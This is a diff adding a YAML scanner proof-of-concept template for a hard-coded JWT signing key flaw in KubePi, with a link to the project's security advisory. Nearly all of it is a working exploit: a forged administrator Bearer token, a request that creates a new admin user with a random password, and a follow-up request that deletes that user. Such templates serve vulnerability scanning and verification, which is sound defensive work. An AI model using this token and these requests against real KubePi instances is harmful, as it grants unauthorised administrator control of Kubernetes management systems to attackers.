@@ -1,0 +1,31 @@
+name: poc-yaml-kubepi-jwtsigkey-hard-coded
+manual: true
+transport: http
+set:
+    rStr1: randomLowercase(8)
+rules:
+    r1:
+        request:
+            cache: true
+            method: POST
+            path: /kubepi/api/v1/users
+            headers:
+                Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiYWRtaW4iLCJuaWNrTmFtZSI6IkFkbWluaXN0cmF0b3IiLCJlbWFpbCI6InN1cHBvcnRAZml0MmNsb3VkLmNvbSIsImxhbmd1YWdlIjoiemgtQ04iLCJyZXNvdXJjZVBlcm1pc3Npb25zIjp7fSwiaXNBZG1pbmlzdHJhdG9yIjp0cnVlLCJtZmEiOnsiZW5hYmxlIjpmYWxzZSwic2VjcmV0IjoiIiwiYXBwcm92ZWQiOmZhbHNlfX0.XxQmyfq_7jyeYvrjqsOZ4BB4GoSkfLO2NvbKCEQjld8
+                Content-Type: application/json
+            body: '{"authenticate": {"password": "{{rStr1}}"},"email": "{{rStr1}}@qq.com","isAdmin": true,"mfa": {"enable": false},"name": "{{rStr1}}","nickName": "{{rStr1}}","roles": ["Supper User"]}'
+            follow_redirects: false
+        expression: 'response.status == 200 && response.body_string.contains("\"createdBy\": \"admin\"") && response.body_string.contains("\"success\": true")'
+    r2:
+        request:
+            cache: true
+            method: DELETE
+            path: /kubepi/api/v1/users/{{rStr1}}
+            headers:
+                Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiYWRtaW4iLCJuaWNrTmFtZSI6IkFkbWluaXN0cmF0b3IiLCJlbWFpbCI6InN1cHBvcnRAZml0MmNsb3VkLmNvbSIsImxhbmd1YWdlIjoiemgtQ04iLCJyZXNvdXJjZVBlcm1pc3Npb25zIjp7fSwiaXNBZG1pbmlzdHJhdG9yIjp0cnVlLCJtZmEiOnsiZW5hYmxlIjpmYWxzZSwic2VjcmV0IjoiIiwiYXBwcm92ZWQiOmZhbHNlfX0.XxQmyfq_7jyeYvrjqsOZ4BB4GoSkfLO2NvbKCEQjld8
+            follow_redirects: false
+        expression: 'response.status == 200 && response.body_string.contains("\"success\": true")'
+expression: r1() && r2()
+detail:
+    author: secking
+    links:
+        - https://github.com/KubeOperator/KubePi/security/advisories/GHSA-vjhf-8vqx-vqpq
